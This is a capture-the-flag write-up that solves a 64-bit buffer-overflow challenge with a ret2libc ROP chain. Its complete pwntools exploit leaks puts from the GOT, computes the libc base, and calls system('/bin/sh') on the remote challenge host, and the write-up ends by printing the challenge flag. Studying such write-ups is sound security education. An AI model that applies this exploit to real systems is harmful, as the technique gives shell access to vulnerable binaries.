<img src="https://github.com/raul-dunca/assets/blob/main/.images_CyberStudents-advent-of-ctf2024/day16_description.png">

First, I decompiled the binary in dogbolt:
<img src="https://github.com/raul-dunca/CyberStudents-advent-of-ctf2024/blob/main/.assets/day_16_info.png">

Its a simple program, but there is a buffer overflow at `fgets(&buf, 0x80, stdin);`, where 128 bytes are read inside buf, which is a type void. There is no win function so I used ROP. The file is also a 64 bit executable, which is important to keep in mind. First I tried to find the correct offset using the same approach as in the previous binary challange ([day10]()). Basically 
I used `cyclic_find` to which I added 8 bytes (size of RBP) and the final offset was `72`. Alright, now my ideas was to leak the puts address, which then will help me calculate the base address of libc. This is needed since ASLR is enabeled. Since this was a 64 bit executable (remember!?) we also need to be carefull how parameters are passed to functions. Basically a ROP gadget is needed to pop the value of RDI (throught which function parameters are passed). To find one I used:
```bash
ROPgadget --binary main | grep "pop rdi"
```
Now, we just need to put the value we want to print (in this case is the memory address of puts) in RDI and then put the function call on the stack. Finally, we need to re-run the main function, so we can do the actual exploit and get the shell.  Here is the exploit described so far:
```python
from pwn import *

elf = ELF('./main')
libc = ELF('libc.so.6') 

rop = ROP(elf) 

buffer_offset = 72          
pop_rdi_ret = 0x0000000000401196       
puts_plt = elf.plt['puts']   
puts_got = elf.got['puts']  
main_addr = 0x4011ee  

payload = b"A" * buffer_offset          
payload += p64(pop_rdi_ret)              
payload += p64(puts_got)                 
payload += p64(puts_plt)                 
payload += p64(main_addr)
```
Sending the payload now, a line is returned which shows us what we entered and at the end the leaked puts address, so its important to parse this correctly to get the correct address. I definitely made my approach more complicated than it needed to be:


```python
p = process('./main')          
p.recvuntil("Glaki says: Enter the secret code to unlock the vault:") 
p.sendline(payload)                      

output = p.recvline()  
hex_output = ' '.join('{:02x}'.format(byte) for byte in output)
raw_bytes = bytes.fromhex(hex_output.replace(' ', '')) 

search_sequence = b'\x96\x11\x40'
position = raw_bytes.find(search_sequence)
result = raw_bytes[position + len(search_sequence):]
result_without_last_byte = result[:-1]

print(result_without_last_byte)

leaked_puts = int.from_bytes(result_without_last_byte, byteorder='little')

```

I transform the data to hex and look at the bytes after the `96 11 40` sequence which is the address of pop_rdi_ret, but in little endian. Then I just delete the last byte which is the `\n` character and transofrmed the addres to big endian and then make it an integer value.

Now, I can calculate the value of the base libc by substracting from the memory address of puts, the offset of puts. With the base libc I can calculate the memory address of the `system` function and the `\bin\sh` string:

```python
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

```
Finally we craft the exploit in a similar manner as for the first step, with the only difference being the addition of a ret gadget, which is used for stack alignment.

```python
ret = rop.find_gadget(['ret'])[0] 

payload = b"A" * buffer_offset
payload += p64(ret)             #for stack alignment !!!
payload += p64(pop_rdi_ret)  
payload += p64(bin_sh_addr)
payload += p64(system_addr) 

p.recvuntil("Glaki says: Enter the secret code to unlock the vault:") 
p.sendline(payload)
p.interactive() 
```

Then we get a shell and thus the flag if we connect remote. Below is my final complete script with some addtional prints:

```python
from pwn import *

elf = ELF('./main')
libc = ELF('libc.so.6') 
context.log_level='debug'

io = process(elf.path)

rop = ROP(elf) 

# Attach gdb to the running process
#gdb.attach(io, gdbscript=""" set environment LD_LIBRARY_PATH ./libc.so.6 """)

host = "ctf.csd.lol"
port = 2020 

buffer_offset = 72          
pop_rdi_ret = 0x0000000000401196       
puts_plt = elf.plt['puts']   
print("puts_p in Hex:", hex(puts_plt))
puts_got = elf.got['puts']  
print("puts_got in Hex:", hex(puts_got))
main_addr = 0x4011ee         


payload = b"A" * buffer_offset          
payload += p64(pop_rdi_ret)              
payload += p64(puts_got)                 
payload += p64(puts_plt)                 
payload += p64(main_addr)                


#p= process('./main')
p = remote(host,port)          
p.recvuntil("Glaki says: Enter the secret code to unlock the vault:") 
p.sendline(payload)                      



output = p.recvline()  
print("TESTTT "+ output.decode(errors='ignore'))
hex_output = ' '.join('{:02x}'.format(byte) for byte in output)
print("TESTTT " + hex_output)


raw_bytes = bytes.fromhex(hex_output.replace(' ', ''))  

# Take the bytes after pop_rdi_ret address
search_sequence = b'\x96\x11\x40'

position = raw_bytes.find(search_sequence)

result = raw_bytes[position + len(search_sequence):]
print(result)

result_without_last_byte = result[:-1]
print(result_without_last_byte)

leaked_puts = int.from_bytes(result_without_last_byte, byteorder='little')
print(leaked_puts)

libc_base = leaked_puts - libc.symbols['puts']
print(libc.symbols['puts'])
print("libc_base: " + str(libc_base))

system_addr = libc_base + libc.symbols['system']
print("system_addr: " + str(system_addr))

bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
print("bin_sh_addr : " + str(bin_sh_addr ))

ret = rop.find_gadget(['ret'])[0] 

payload = b"A" * buffer_offset
payload += p64(ret)             #for stack alignment !!!
payload += p64(pop_rdi_ret)  
payload += p64(bin_sh_addr)
payload += p64(system_addr) 


p.recvuntil("Glaki says: Enter the secret code to unlock the vault:") 
p.sendline(payload)
p.interactive() 

```

An important note is to remember to use `pwnutils` for the local exploit when the libc is given, I personally did not know that and I had the correct script locally, but of course it didn't work because it's not loading the correct libc. So just putting the executable and libc file in the same directory is not enough !!!


`csd{J1Ngl3_b3ll_r0CK_15_b357_XM45_50NG}`
